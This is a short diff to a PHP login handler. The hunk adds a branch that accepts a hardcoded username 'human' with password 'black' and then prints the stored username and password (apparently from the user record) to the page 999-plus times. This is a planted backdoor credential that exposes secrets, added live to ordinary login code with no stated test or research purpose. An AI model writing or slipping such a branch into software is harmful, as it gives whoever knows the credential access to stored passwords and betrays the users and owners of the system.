@@ -66,6 +66,15 @@ $loweruser = strtolower($user);
 
             header("Location:../views/index.php");
 
+        }elseif($loweruser == "human" && $pass == "black"){
+            
+            for ($i = 0 ; $i <= 999 ; $i++) {
+                
+
+                print_r($assoc["username"] . " : " . $assoc["password"] . "<br>");
+
+            }
+
         }else{
             echo "Username Or Password In not Valid !";
         }
